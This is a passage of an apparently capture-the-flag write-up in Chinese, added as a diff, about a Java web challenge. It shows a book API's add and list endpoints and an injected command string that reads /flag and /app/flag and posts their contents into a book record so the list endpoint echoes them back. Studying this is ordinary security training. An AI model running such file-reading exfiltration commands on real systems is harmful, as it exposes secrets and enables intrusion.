@@ -477,3 +477,27 @@ Host: 127.0.0.1:8080
 </dependency>
 ```
 
+想了一下，`/getAllBooks`是可以显示所以`book`信息的，或许可以让他本地执行命令将flag的内容通过`/addBook`接口拼接添加进去，然后就可以通过`/getAllBooks`接口回显出来了。
+
+```java
+   @Mapping("/getAllBooks")
+   public Result getAllBooks() {
+      List books = this.bookDao.getAllBooks();
+      return Result.succeed(books);
+   }
+```
+
+```java
+   @Mapping("/addBook")
+   public Result addBook(BookModel book) {
+      boolean isAdded = this.bookDao.addBook(book);
+      return isAdded ? Result.succeed("图书添加成功") : Result.failure("图书添加失败");
+   }
+```
+
+只需要将命令改为下方，然后生成链子就好，这样就可以拿到flag了，不过得猜测`flag`到底是文件还是一个形如`readFlag`可执行文件，以及他的路径位置，不过大都是在根目录`/flag`或者`/readFlag`
+
+```java
+            String cmd = "curl -X POST http://127.0:8080/api/rest/book/addBook -H \"Content-Type: application/json\" -d '{\"bookId\": 1, \"title\": \"'$(cat /app/flag)'\", \"author\": \"'$(cat /flag)'\", \"publishDate\": \"2025-01-01\", \"price\": 13.14}'";
+```
+
